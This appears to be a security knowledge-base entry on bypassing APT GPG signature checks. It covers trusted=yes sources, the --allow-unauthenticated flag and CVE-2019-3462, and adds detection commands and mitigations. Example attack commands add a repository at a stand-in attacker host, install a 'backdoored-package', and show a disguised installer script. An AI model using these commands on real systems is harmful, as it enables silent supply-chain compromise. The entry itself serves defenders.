---
name: "APT GPG Signature Verification Bypass"
packageManager: "apt"
slug: "apt-gpg-bypass"
category: "Signature Bypass"
severity: "high"
platform:
  - "Linux"
description: "APT uses GPG signatures to verify the authenticity and integrity of repository metadata (Release files) and packages. However, this verification can be bypassed through several mechanisms: using the trusted=yes option in sources.list entries, passing --allow-unauthenticated to apt-get, or exploiting historical vulnerabilities in older APT versions that allowed signature downgrade attacks. When GPG verification is bypassed, an attacker can serve arbitrary packages from an unsigned repository without triggering warnings, enabling silent supply chain compromise."
prerequisites:
  - "Root or sudo access to modify APT source configuration files (for trusted=yes)"
  - "Or the ability to influence apt-get command-line arguments (for --allow-unauthenticated)"
  - "For downgrade attacks: target must run a vulnerable version of APT (pre-2019 for CVE-2019-3462)"
attackScenarios:
  - title: "Bypass via trusted=yes Repository Option"
    description: "The trusted=yes option in an APT sources.list entry instructs APT to skip all GPG signature verification for that repository. This is sometimes used legitimately for local development repos but, when applied to remote repositories, allows an attacker to serve completely unsigned and unverified packages."
    commands:
      - label: "Add an unsigned repository with GPG bypass"
        code: |
          # The [trusted=yes] option disables ALL signature checks for this source
          echo "deb [trusted=yes] http://packages.attacker.com/debian stable main" | sudo tee /etc/apt/sources.list.d/attacker.list
          sudo apt-get update
        language: "bash"
      - label: "Install packages without any signature verification"
        code: |
          # APT will not warn about missing signatures for this source
          sudo apt-get install -y backdoored-package
        language: "bash"
  - title: "Bypass via --allow-unauthenticated Flag"
    description: "The --allow-unauthenticated flag can be passed to apt-get to suppress signature verification errors for individual install operations. Attackers may embed this flag in malicious install scripts or automation playbooks to silently install unsigned packages."
    commands:
      - label: "Force installation of an unsigned package"
        code: |
          # Bypasses GPG verification for this specific install
          sudo apt-get install --allow-unauthenticated -y suspicious-package
        language: "bash"
      - label: "Malicious install script that hides the flag"
        code: |
          #!/bin/bash
          # install.sh - "Easy installer" distributed by attacker
          echo "Installing security tools..."
          sudo add-apt-repository -y ppa:attacker/tools
          sudo apt-get update
          sudo apt-get install --allow-unauthenticated -y security-suite
        language: "bash"
  - title: "APT HTTP Transport Redirect Exploitation (CVE-2019-3462)"
    description: "In APT versions prior to 1.4.9, 1.6.6, and 1.7.1, an attacker performing a man-in-the-middle attack could exploit improper validation of HTTP redirects in APT's HTTP transport to inject malicious content. The attacker could redirect APT to fetch manipulated Release files from an attacker-controlled URL, circumventing signature verification and enabling installation of attacker-controlled packages."
    commands:
      - label: "Conceptual exploit flow for CVE-2019-3462"
        code: |
          # The vulnerability allowed MITM via HTTP redirect manipulation:
          # 1. APT requests http://repo.example.com/dists/stable/Release
          # 2. Attacker intercepts and returns a 302 redirect to an attacker-controlled URL
          # 3. APT's HTTP transport followed the redirect without validating the target,
          #    allowing the attacker to serve a malicious Release file
          # 4. Attacker-signed or unsigned packages are then accepted
          #
          # Check if the system is vulnerable:
          apt --version
          # Vulnerable: APT < 1.4.9, < 1.6.6, < 1.7.1
        language: "bash"
detection:
  - title: "Scan for trusted=yes in APT source configurations"
    description: "Search all APT source files for the trusted=yes option, which completely disables GPG verification. Any occurrence in production should be investigated and removed unless there is a documented exception for a local repository."
    commands:
      - code: |
          # Find all sources using trusted=yes
          grep -rn "trusted=yes" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
          # Also check for the allow-insecure option
          grep -rn "allow-insecure=yes" /etc/apt/sources.list /etc/apt/sources.list.d/ 2>/dev/null
        language: "bash"
  - title: "Monitor for --allow-unauthenticated usage"
    description: "Audit process execution logs and shell history for apt-get invocations that include the --allow-unauthenticated flag. This flag should never appear in production automation."
    commands:
      - code: |
          # Search shell history files for the flag
          grep -r "allow-unauthenticated" /home/*/.bash_history /root/.bash_history 2>/dev/null
          # Audit via syslog or auditd
          ausearch -c apt-get 2>/dev/null | grep "allow-unauthenticated"
          # Check APT configuration for globally disabled verification
          apt-config dump | grep -i "AllowUnauthenticated"
        language: "bash"
  - title: "Verify APT version is patched against known CVEs"
    description: "Ensure the installed APT version includes fixes for known signature bypass vulnerabilities, particularly CVE-2019-3462."
    commands:
      - code: |
          # Check APT version
          apt --version
          # Verify changelog for security patches
          zgrep -i "CVE-2019-3462" /usr/share/doc/apt/changelog.Debian.gz 2>/dev/null
        language: "bash"
mitigation:
  - "Never use trusted=yes for remote repositories; restrict its use to local or air-gapped development repos only"
  - "Prohibit the use of --allow-unauthenticated in all automation scripts, Ansible playbooks, and CI/CD pipelines"
  - "Set APT::Get::AllowUnauthenticated to false explicitly in /etc/apt/apt.conf.d/ to enforce GPG verification system-wide"
  - "Keep APT updated to the latest version to ensure all signature verification CVEs are patched"
  - "Implement auditd rules to alert on apt-get invocations containing bypass flags"
  - "Use Acquire::AllowInsecureRepositories and Acquire::AllowDowngradeToInsecureRepositories set to false in APT configuration"
references:
  - title: "CVE-2019-3462 - APT Remote Code Execution via Redirect"
    url: "https://ubuntu.com/security/CVE-2019-3462"
  - title: "Debian Wiki - SecureApt"
    url: "https://wiki.debian.org/SecureApt"
  - title: "apt-secure(8) Manual Page"
    url: "https://manpages.debian.org/bookworm/apt/apt-secure.8.en.html"
  - title: "APT Configuration - sources.list(5)"
    url: "https://manpages.debian.org/bookworm/apt/sources.list.5.en.html"
created: 2026-04-02
updated: 2026-04-02
---
